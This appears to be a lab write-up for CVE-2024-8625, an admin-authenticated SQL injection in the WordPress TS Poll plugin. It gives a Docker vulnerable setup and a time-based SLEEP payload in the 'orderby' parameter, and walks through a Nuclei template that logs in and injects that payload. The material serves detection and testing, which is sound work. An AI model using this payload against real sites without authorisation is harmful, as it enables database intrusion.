# CVE-2024-8625: WordPress TS Poll - SQL Injection < 2.4.0

## Description:
WordPress TS Poll plugin < 2.4.0 contains a SQL injection caused by lack of sanitization and escaping of a parameter before using it in a SQL statement, letting attackers perform SQL injection attacks, exploit requires admin privileges.

## Reference:
- https://wpscan.com/vulnerability/ab4d7065-4ea2-4233-9593-0f540f91f45e/
- https://nvd.nist.gov/vuln/detail/CVE-2024-8625

## Vulnerable Setup

- Run the following command to build and start the container:

```
docker build -t cve-2024-8625 . && docker run -d --name cve-2024-8625 --hostname wpserver.local -p 80:80 cve-2024-8625
```

- Once the container is running, edit your hostfile to map the docker-container/localhost to a domain `(wpserver.local)` name.

    ```
    127.0.0.1   wpserver.local www.wpserver.local
    ```
    or
    ```
    172.17.0.2  wpserver.local www.wpserver.local
    ```
- After edit you hosts file, browse http://wpserver.local/wordpress/wp-login.php.

## Login credentials

Username: admin

Password: admin

# Exploitation Steps

- Navigate to the admin Panel http://wpserver.local/wordpress/wp-login.php

- Enter the Credentials (admin/admin) as shown below.

<img width="959" height="943" alt="image" src="https://github.com/user-attachments/assets/a2282251-fbd0-4828-9b2b-3f27e1d2404b" />


- Send a GET request to the `/wp-admin/admin.php?page=ts-poll&orderby=%28SELECT+6127+FROM+%28SELECT%28SLEEP%285%29%29%29mIWx%29&order=desc` endpoint with sqli sleep payload.

<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/ce8ddf1b-5254-4a46-a1fc-4a46e357b643" />

- Observe that the payload is executed and the server response is delayed.

# Steps to Write Nuclei Template

Flow Section

```yaml
flow: http(1) && http(2)
```

* Executes login first.
* Runs SQLi check only if login succeeds.

**First Request: WordPress Login**

```yaml
http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&redirect_to=

    matchers:
      - type: dsl
        dsl:
          - contains(header, "wordpress_logged_in")
        internal: true
```

* Confirms successful login via WordPress session cookie.
* `internal: true` → Used only for authentication check.


**Second Request: Time-Based SQL Injection**

```yaml
  - raw:
      - |
        @timeout: 30s
        GET /wp-admin/admin.php?page=ts-poll&orderby=%28SELECT+6127+FROM+%28SELECT%28SLEEP%2810%29%29%29mIWx%29&order=desc HTTP/1.1
        Host: {{Hostname}}
```

* Injects `SLEEP(10)` payload into `orderby` parameter.
* `@timeout: 30s` for the delayed response.

**Matchers**

```yaml
    matchers:
      - type: dsl
        dsl:
          - 'duration>=10'
          - 'status_code==200'
```

* Match Response delay ≥10 sec → SQL executed.
* Status 200 → Valid server response.

---


## Nuclei Template URL :

## Nuclei Command :

```bash
nuclei -t CVE-2024-8625.yaml -u http://wpserver.local/wordpress -var username=admin -var password=admin
```

<img width="1899" height="580" alt="image" src="https://github.com/user-attachments/assets/36ffbfbe-3b4d-48a4-95d7-92f83e8abcc3" />
